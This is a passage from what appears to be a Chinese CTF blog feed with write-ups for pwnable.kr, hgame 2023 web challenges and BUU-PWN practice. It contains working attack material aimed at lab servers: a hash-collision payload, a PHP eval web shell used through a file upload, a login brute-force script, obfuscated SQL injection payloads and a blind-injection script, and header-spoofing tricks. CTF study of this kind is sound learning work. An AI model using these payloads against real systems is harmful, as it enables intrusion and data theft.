        <content type="html"><![CDATA[<blockquote><p>The main purpose of pwnable.kr is <strong>FUN</strong>.</p></blockquote><span id="more"></span><h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h1><h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1.[fd]"></a>1.[fd]</h2><blockquote><p>本题主要是记录一下第一次使用pwnable.k网站的流程</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.7dfr1izz0a68.webp"></p><p><code>ssh连接</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.2toplryf0kn4.webp"></p><p>一开始我以为就是最简单的签到题直接<code>cat flag</code>，但是被禁用了。</p><p>于是我们看看fd.c里面是什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我犯了一个错误：</p><p>​    <a class="link" href="https://blog.csdn.net/u010806950/article/details/105505540?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167565418516800184193990%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167565418516800184193990&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105505540-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=atoi&spm=1018.2226.3001.4187">atoi函数<i class="fas fa-external-link-alt"></i></a>的不熟悉，应该输入<code>4660(0x1234的十进制表示)</code>而不是<code>0x1234</code>(因为遇到字母<code>x</code>判定不合法就结束了)</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.w9hx9olcklc.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.17bvsp335l4w.webp"></p><p>​    回到题目本身所提出的问题：What is a file descriptor in Linux?</p><p>​    <a class="link" href="https://wiyi.org/linux-file-descriptor.html#file-descriptor">佬blog<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.15gwx34bgd6.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.6r0u6wq6idmo.webp"></p><p>  此题关于<code>fd</code>就是控制<code>read函数</code>。</p><h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2.collision"></a>2.collision</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.5mzmcv0pkgsg.webp"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span> <span class="comment">//关键是这个算法</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//0x1DD905E8,0x01010101,0x01010101,0x01010101,0x01010101</span></span><br><span class="line">    <span class="comment">// `python -c &quot;print &#x27;\x01&#x27; * 16 + &#x27;\xE8\x05\xD9\x1D&#x27;&quot;`</span></span><br><span class="line">    <span class="comment">// \x01 *16 + \xe8\x05\xd9\x1d</span></span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p; </span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//add</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个ip[i]值为%d\n&quot;</span>,i,ip[i]);</span><br><span class="line">res += ip[i];</span><br><span class="line">        <span class="comment">//add</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个res的值为%d\n&quot;</span>,i,res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#x27;python -c &quot;print ‘\xe8\x05\xd9\x1d’ + ‘\x01’*16’&quot;&#x27;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="comment">//add    </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d≠%d&quot;</span>,check_password( argv[<span class="number">1</span>] ),<span class="number">0x21DD09EC</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &quot;print &#x27;\x01&#x27; * 16 + &#x27;\xE8\x05\xD9\x1D&#x27;&quot;`</span><br></pre></td></tr></table></figure><p>参考文章：<a class="link" href="https://blog.csdn.net/Z_Pathon/article/details/98850196?ops_request_misc=&request_id=&biz_id=102&utm_term=MD5%20hash%20collision&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-98850196.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&spm=1018.2226.3001.4187">点此跳转<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230206/%E5%9B%BE%E7%89%87.68tutim1k3gg.webp"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgamectf</title>
      <link href="/2023/02/05/0_PWN/2023hgamectf/"/>
      <url>/2023/02/05/0_PWN/2023hgamectf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Web like high sky  , Pwn like deep sea .</p></blockquote><span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Classic-Childhood-Game"><a href="#1-Classic-Childhood-Game" class="headerlink" title="1.Classic Childhood Game"></a>1.Classic Childhood Game</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.2s20ylq8l48w.webp"></p><p>​    打开网站发现是一个游戏，我的思路有下：</p><ol><li>修改分数类型。</li><li>藏在源码类型。</li><li>源码中有隐藏函数，找到该函数，放在console中执行类型。</li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.34fvdqk9vsw0.webp"></p><p>查看源码发现了一个解密函数<code>mota()</code>，在console中运行得到flag。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.17w2gm24rlgg.webp"></p><p>发现一个好玩的网站：<a class="link" href="https://cyberchef.cn/">cyberchef<i class="fas fa-external-link-alt"></i></a>，直接解码得到flag。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.6m8tldhv8eio.webp"></p><h2 id="2-Become-A-Member"><a href="#2-Become-A-Member" class="headerlink" title="2.Become A Member"></a>2.Become A Member</h2><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money…… 想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗?</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 请先提供一下身份证明（Cute-Bunny）哦</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line"># 每一个能够成为会员的顾客们都应该持有名为Vidar的邀请码（code）</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line"># 由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line"># 就差最后一个本地的请求，就能拿到会员账号啦</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.7g0wbyz9iruo.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.4ttazxhd4k5c.webp"></p><h2 id="3-Guess-Who-I-Am"><a href="#3-Guess-Who-I-Am" class="headerlink" title="3.Guess Who I Am"></a>3.Guess Who I Am</h2><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.53vjyq5roohs.webp"></p><p>打开源码，发现<code>Hint</code></p><p>输入该文档对应的id，对应正确则Score++</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1br74mg4m23k.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.16ei54k72grk.webp"></p><p>​    根据题目说明，当<code>score&gt;=100</code>会输出flag。</p><p>​    写个脚本，成功得到flag：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.30cki5fxsf0g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">answer= [hint页信息]</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># 保持会话</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    getscore = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/getScore&quot;</span></span><br><span class="line">    <span class="comment"># 获取分数 GET</span></span><br><span class="line">    getquestion = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30010/api/getQuestion&#x27;</span></span><br><span class="line">    <span class="comment"># 提问信息 GET</span></span><br><span class="line">    verifyanswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/verifyAnswer&quot;</span></span><br><span class="line">    <span class="comment"># 答题 POST</span></span><br><span class="line">    r1 = s.get(getscore)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">        <span class="built_in">print</span>(r1.json()[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 最后打印flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r2 = s.get(getquestion)</span><br><span class="line">        data1 = r2.json()</span><br><span class="line">        find_id=data1[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> answer:</span><br><span class="line">            <span class="keyword">if</span> find_id <span class="keyword">in</span> j.values():</span><br><span class="line">                <span class="built_in">id</span> = j[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:<span class="built_in">id</span>&#125;</span><br><span class="line">        r3 = s.post(verifyanswer,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Correct answer!&quot;</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>次正确&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="4-Show-Me-Your-Beauty"><a href="#4-Show-Me-Your-Beauty" class="headerlink" title="4.Show Me Your Beauty"></a>4.Show Me Your Beauty</h2><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D 不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p><code>文件上传</code></p><p>这道题难度不大，让我很好地回忆了文件上传类题目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;b&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.5cc3qg06awzk.webp"></p><p>剑蚁连接</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1n19hkwmzfcw.webp"></p><p>得到flag</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.3n05ae4vtio0.webp"></p><h2 id="5-Git-Leakage"><a href="#5-Git-Leakage" class="headerlink" title="5.Git Leakage"></a>5.Git Leakage</h2><blockquote><p>电视剧里的黑客?真正的黑客！</p></blockquote><p>​    题目还挺炫酷的，题目提示，使用<code>GitHack</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1lhttixd9s68.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.31p7l6ffy60w.webp"></p><p>用记事本打开下载到的文件<code>Th1s_1s-flag</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3wekfqh4nzb4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3z35si9dzz28.webp"></p><h3 id="6-v2board"><a href="#6-v2board" class="headerlink" title="6.v2board"></a>6.v2board</h3><blockquote><p>请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p>随便注册一个账号，登陆时候<code>burp</code>抓包，回报报文：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6r7foqrscpog.webp"></p><p>参考这篇博文：<a class="link" href="http://wiki.peiqi.tech/wiki/webapp/V2Board/V2Board%20Admin.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html">v2board漏洞<i class="fas fa-external-link-alt"></i></a></p><h2 id="7-Search-Commodity"><a href="#7-Search-Commodity" class="headerlink" title="7.Search Commodity"></a>7.Search Commodity</h2><blockquote><p>R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货） R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码” 貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？ (数据库启动需要时间，若出现Internal Error，需要稍等片刻)</p><p>HINTS:</p><p>密码是弱密码，可以自己找个dict爆破一下</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/login&quot;</span></span><br><span class="line">    dic = <span class="built_in">open</span>(<span class="string">&quot;D:\\桌面\\dic.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        req = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;user01&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: i</span><br><span class="line">        &#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Login Failed&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(n,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;失败&#x27;</span>)</span><br><span class="line">            n = n+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6jx11tsbsnb4.webp"></p><p>密码为<code>admin123</code></p><p>SESSION:<code>MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1tpf0sji5lj4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.43ohcls3a6ps.webp"></p><p>​    编写了一个脚本，用于探测语句被过滤的情况：<mark>(待查看)</mark></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/search&quot;</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    trytxt = <span class="string">&quot;0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(name),1/*a*/frOm/*a*/information_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#&quot;</span></span><br><span class="line">    curr_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> curr_index &gt;= <span class="built_in">len</span>(trytxt):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = <span class="built_in">ord</span>(trytxt[curr_index])</span><br><span class="line">        ret = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;search_id&#x27;</span>: <span class="string">&#x27;if(ascii(substr(&quot;%s&quot;, %s, 1))-%s, 1, 0)  #&#x27;</span> % (trytxt, index + <span class="number">1</span>, i)</span><br><span class="line">        &#125;, headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;SESSION=MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">            s += <span class="built_in">chr</span>(i)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">        curr_index += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(table_name),1/*a*/frOm/*a*/infOrmation_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(column_name),1/*a*/frOm/*a*/infOrmation_schema.columns/*a*/whEre/*a*/table_name/*a*/LiKe/*a*/&#x27;5ecret15here&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(f14gggg1shere),1/*a*/frOm/*a*/5ecret15here#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.48zi2qquby2o.webp"></p><p>参考wp: <a class="link" href="https://blog.csdn.net/vvbbnn00/article/details/128721089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167629589916800211554804%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167629589916800211554804&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-128721089-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=hgame2023&spm=1018.2226.3001.4187">wp<i class="fas fa-external-link-alt"></i></a></p><p>DLP helps to classify and tag data securely and flags unusual activity around it</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-PWN刷题笔记</title>
      <link href="/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/"/>
      <url>/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Well begun is half done.</code></p></blockquote><span id="more"></span><h1 id="BUU-PWN刷题笔记"><a href="#BUU-PWN刷题笔记" class="headerlink" title="BUU-PWN刷题笔记"></a>BUU-PWN刷题笔记</h1><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226175437031.534yw6j44a2o.webp"></p><p>（这么可爱的刷题网站，这还不刷？？？！！！）</p><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>签到</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>ret2text</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194855385.4d4ve3gqsj5s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194952701.62vsmrp0e7eo.webp"></p><p>没啥意义，ret2text。</p><p>倒是学习了一下C语言的write函数和sprintf函数</p><p><a class="link" 